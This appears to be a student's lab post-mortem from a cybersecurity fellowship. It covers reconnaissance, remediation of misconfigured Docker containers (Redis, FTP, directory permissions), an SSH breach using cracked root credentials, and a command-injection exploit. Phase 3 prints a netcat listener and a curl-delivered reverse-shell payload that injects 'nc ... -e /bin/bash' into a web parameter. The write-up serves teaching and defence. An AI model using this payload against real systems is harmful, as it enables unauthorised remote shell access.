# Phase 1 Final Reckoning — TEPP Post-Mortem

**Operator:** Vishal Harbance
**Date:** May 28, 2026
**Repository:** https://github.com/Vishalha1/Foundations_Lab_Final
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24

The triage network contained three live hosts: 172.100.0.11, 172.100.0.12, and 172.100.0.13. Host 172.100.0.11 exposed Redis on port 6379, which was a serious misconfiguration because Redis should not be reachable across the network without protection. Host 172.100.0.12 exposed FTP on port 21, which increased the attack surface by allowing an unnecessary file transfer service to run. Host 172.100.0.13 required local inspection because the vulnerability was not only an open port issue, but a dangerous file permission problem inside the web directory.

### Breach Network — 172.80.0.0/24

The breach network contained one major target, 172.80.0.10, with SSH exposed on port 22. This service was important because SSH allows remote login, and weak credentials can turn an exposed SSH service into a breach path. The reconnaissance results showed that credential testing was the correct next step because the target allowed password authentication. This finding connected directly to the breach phase because an attacker could attempt to log in remotely as root.

### Exploitation Network — 172.60.0.0/24

The exploitation network contained host 172.60.0.10 with a web application exposed on port 80. The application accepted user input through the URL path `/exec?cmd=`, which showed a command injection weakness. This was dangerous because the application passed user-controlled input to the operating system. Before exploitation, the exposed web service and unsafe command parameter showed that the application could potentially execute attacker-supplied commands.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11

**Vulnerability Identified:**
The first server exposed Redis on port 6379. Redis was configured with protected mode disabled and bound to `0.0.0.0`, meaning it was listening broadly instead of being restricted safely.

**Remediation Commands:**

```bash
docker exec broken_server_1 redis-cli CONFIG GET protected-mode
docker exec broken_server_1 redis-cli CONFIG GET bind
docker exec broken_server_1 redis-cli CONFIG SET protected-mode yes
docker exec broken_server_1 redis-cli CONFIG GET protected-mode
```

**Before State:**
Before remediation, Redis was running with protected mode disabled and was bound to `0.0.0.0`.

**After State:**
After remediation, Redis protected mode was enabled.

**Analysis:**
Exposed Redis is dangerous because attackers may attempt to read, modify, or abuse data stored in memory. In a real enterprise environment, Redis should not be publicly reachable without strict network controls and authentication. Enabling protected mode reduces the risk by making the service safer against unauthorized remote access.

### Server 2 — 172.100.0.12

**Vulnerability Identified:**
The second server had a rogue FTP service running on port 21. This was confirmed by identifying the FTP service during reconnaissance and checking the running `vsftpd` process inside the container.

**Remediation Commands:**

```bash
docker exec broken_server_2 ps aux
docker exec broken_server_2 sh -c "kill $(pidof vsftpd)"
docker exec broken_server_2 ps aux
```

**Before State:**
Before remediation, the `vsftpd` process was running and exposing FTP.

**After State:**
After remediation, the FTP process was terminated.

**Analysis:**
A rogue FTP service is dangerous because it increases the attack surface and may allow unauthorized file transfer or credential exposure. In a real enterprise environment, unnecessary services should be disabled or removed. Reducing exposed services helps lower the chance of attackers finding an easy entry point.

### Server 3 — 172.100.0.13

**Vulnerability Identified:**
The third server had dangerous permissions on `/var/www/html`. The `/var/www` directory appeared normal with 755 permissions, but `/var/www/html` was world-writable with 777 permissions.

**Remediation Commands:**

```bash
docker exec broken_server_3 ls -ld /var/www
docker exec broken_server_3 ls -ld /var/www/html
docker exec broken_server_3 chmod 755 /var/www/html
docker exec broken_server_3 ls -ld /var/www/html
```

**Before State:**
Before remediation, `/var/www/html` had 777 permissions, allowing all users to read, write, and execute.

**After State:**
After remediation, `/var/www/html` was changed to 755 permissions.

**Analysis:**
World-writable web directories are dangerous because attackers or unauthorized users may be able to upload, replace, or modify web files. This can lead to web defacement, malware hosting, or persistence. Least privilege permissions help protect the server by allowing only the necessary access.

---

## Phase 2: The Breach

**Cracked Credentials:**

* Username: root
* Password: admin123

**Forensic Evidence:**

* Exact Timestamp of Successful Login: May 28 2026, successful SSH login recorded in `~/Midterm_Logs/auth.log`
* Attacker IP Address: 172.80.0.1

**Engineered iptables Rule:**

```bash
docker exec midterm_target iptables -A INPUT -s 172.80.0.1 -p tcp --dport 22 -j DROP
```

**SOC Analysis:**
A single iptables rule is not enough because it only blocks one known attacker IP address and does not fix the weak credential problem. A real SOC would also disable root SSH login, require stronger passwords or SSH keys, monitor authentication logs, and alert on repeated failed login attempts. These controls work together because blocking one IP does not stop the same attacker from returning from another source.

---

## Phase 3: Full Spectrum

**Listener Configuration:**

```bash
nc -lvnp 4444
```

**Reverse Shell Payload:**

```bash
curl -A "TEPP-Operator" "http://172.60.0.10/exec?cmd=nc%20172.60.0.1%204444%20-e%20/bin/bash"
```

**Command Injection Explanation:**
Command injection happens when an application passes user-controlled input directly into an operating system command. This application was vulnerable because the `/exec?cmd=` parameter was decoded and executed by the server using shell execution. Because the application did not properly validate or sanitize the input, an attacker could submit a reverse shell command through the URL.

**Forensic Evidence:**

* Process ID (PID): Recorded in `~/Capstone_Logs/access.log`
* User-Agent: TEPP-Operator

**Lockdown Command:**

```bash
docker exec capstone_target iptables -A OUTPUT -p tcp -d 172.60.0.1 --dport 4444 -j DROP
```

**Final Analytical Paragraph:**
Executing this attack showed me that defense must be layered because one weak service or one unsafe application feature can create a full breach path. The reconnaissance phase helped identify exposed services, the breach phase showed how weak credentials can be abused, and the exploitation phase showed how command injection can lead to remote command execution. The single defensive control that would have stopped the web breach entirely is secure input handling that prevents user input from being executed by the operating system. If the application had used strict allow-list validation and avoided shell execution, the reverse shell payload would not have worked. Network controls such as iptables are helpful, but secure application design would have stopped the attack before it reached the operating system.

---

## References

Docker. (2024). Docker documentation. https://docs.docker.com

Hydra Project. (2024). THC-Hydra: A fast and flexible online password cracking tool. https://github.com/vanhauser-thc/thc-hydra

Nmap Project. (2024). Nmap network scanning tool. https://nmap.org
